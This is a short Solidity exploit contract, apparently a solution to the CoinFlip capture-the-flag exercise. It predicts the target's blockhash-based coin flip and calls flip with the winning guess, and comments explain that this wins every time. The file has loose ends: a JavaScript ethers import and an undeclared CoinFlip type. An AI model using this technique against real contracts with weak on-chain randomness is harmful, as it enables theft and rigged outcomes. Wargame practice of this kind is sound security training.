// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";
import { ethers } from '../../node_modules/ethers';

contract Attack {

    using SafeMath for uint256;
    CoinFlip public coinFlipContract;
    uint256 immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);
    }

    /// @notice Attack the CoinFlip contract, replicates the poor random number generation code from CoinFlip
    function attack () public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 outcomeInt = blockValue.div(FACTOR);
        bool guess = outcomeInt == 1 ? true : false;

        coinFlipContract.flip(guess);
    }
}

// In the constructor, we pass the address of the CoinFlip contract as a parameter. This is the contract we want to attack.

// We can then simply deploy the contract and call the attack function. We will then pass the guess side correctly every single time.